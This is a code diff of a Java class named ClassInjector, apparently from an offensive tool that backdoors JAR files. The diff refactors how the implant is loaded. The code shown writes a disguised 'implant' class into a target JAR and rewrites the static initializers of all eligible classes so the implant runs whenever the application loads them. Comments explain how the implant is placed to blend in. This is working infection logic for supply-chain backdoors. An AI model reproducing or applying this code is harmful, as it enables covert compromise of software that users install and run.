@@ -14,28 +14,10 @@ import static org.example.injector.Helpers.*;
 
 public class ClassInjector {
     final static String IMPLANT_CLASS_NAME = "Init";
-    private final Class<?> implantClass;
-    private final Path implantClassFilePath;
+    private final ImplantHandler implantHandler;
 
-    public ClassInjector(Class<?> implantClass) {
-        this.implantClass = implantClass;
-        this.implantClassFilePath = null;
-    }
-
-    public ClassInjector(Path implantClassFilePath) {
-        this.implantClass = null;
-        this.implantClassFilePath = implantClassFilePath;
-    }
-
-    // Unfortunately, ClassFile is not Cloneable so a fresh instance needs to be read for every injection
-    private ClassFile loadFreshImplantInstance() throws IOException, ClassNotFoundException {
-        if (implantClass != null) {
-            return ImplantReader.findAndReadClassFile(implantClass);
-        } else if (implantClassFilePath != null) {
-            return ImplantReader.readImplantClass(implantClassFilePath);
-        } else {
-            throw new RuntimeException("Somehow, the implant class is not specified.");
-        }
+    public ClassInjector(ImplantHandler implantHandler) {
+        this.implantHandler = implantHandler;
     }
 
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
@@ -59,38 +41,37 @@ public class ClassInjector {
                     continue;
                 }
 
+                ClassFile currentlyProcessing;
                 try (DataInputStream in = new DataInputStream(entry.getContent())) {
-                    ClassFile currentlyProcessing = new ClassFile(in);
-
-                    String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
-                    if (implantedClass == null) {
-                        /*
-                         * Since there are other classes in this directory, the implant will blend in better here.
-                         * Any directory will do and only one occurrence of the implant class in the JAR is enough.
-                         */
-                        ClassFile implant = loadFreshImplantInstance();
-                        deepRenameClass(implant, targetPackageName, IMPLANT_CLASS_NAME);
-                        JarEntry newJarEntry = convertToJarEntry(implant);
-                        implant.write(fiddler.addNewEntry(newJarEntry));
-                        System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
-
-                        implantedClass = implant;
-                    }
-
-                    /*
-                     * As the class is now planted into the JAR, it must be referred to somehow (by anything running)
-                     * in order to be loaded. Modify the class initializer (static block) of all eligible classes to
-                     * explicitly use the implant class. The implant will thus be called upon once per class that is
-                     * infected. Remember that a class initializer will run only once per class.
-                     * Several classes are infected because it's difficult to know what specific class will be used
-                     * by an app.
-                     */
-                    modifyClinit(currentlyProcessing, implantedClass);
-                    currentlyProcessing.write(entry.addAndGetStream());
-                    System.out.println("[+] Modified class initializer for '" + currentlyProcessing.getName() + "'.");
-                } catch (ClassNotFoundException e) {
-                    throw new RuntimeException(e);
+                    currentlyProcessing = new ClassFile(in);
                 }
+
+                String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
+                if (implantedClass == null) {
+                    /*
+                     * Since there are other classes in this directory, the implant will blend in better here.
+                     * Any directory will do and only one occurrence of the implant class in the JAR is enough.
+                     */
+                    ClassFile implant = implantHandler.loadFreshSpecimen();
+                    deepRenameClass(implant, targetPackageName, IMPLANT_CLASS_NAME);
+                    JarEntry newJarEntry = convertToJarEntry(implant);
+                    implant.write(fiddler.addNewEntry(newJarEntry));
+                    System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
+
+                    implantedClass = implant;
+                }
+
+                /*
+                 * As the class is now planted into the JAR, it must be referred to somehow (by anything running)
+                 * in order to be loaded. Modify the class initializer (static block) of all eligible classes to
+                 * explicitly use the implant class. The implant will thus be called upon once per class that is
+                 * infected. Remember that a class initializer will run only once per class.
+                 * Several classes are infected because it's difficult to know what specific class will be used
+                 * by an app.
+                 */
+                modifyClinit(currentlyProcessing, implantedClass);
+                currentlyProcessing.write(entry.addAndGetStream());
+                System.out.println("[+] Modified class initializer for '" + currentlyProcessing.getName() + "'.");
             }
 
             if (foundSignedClasses) {
